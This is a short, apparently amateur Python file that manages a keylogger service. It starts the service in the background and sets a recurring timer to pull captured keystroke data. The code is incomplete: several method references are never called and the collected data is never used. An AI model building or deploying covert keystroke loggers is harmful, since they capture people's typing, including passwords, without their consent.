from writer import json_writer
import time
from key_logger_service.key_Logger_service import KeyLoggerService
import threading

class KeyLoggerManager:

    def __init__(self):
        self.key_logger_service = KeyLoggerService()


    def start_get_data_counter(self):
        t = threading.Timer(100.0, self.start_get_data_counter)
        t.daemon = True
        t.start()

        keys_data = self.key_logger_service.get

        
         
    def run(self):
        '''
        Runs the program in the background
        '''
        if self.key_logger_service.start: # Try running the service, if it does start counter for getting the data every feew minutes
            self.start_get_data_counter()    





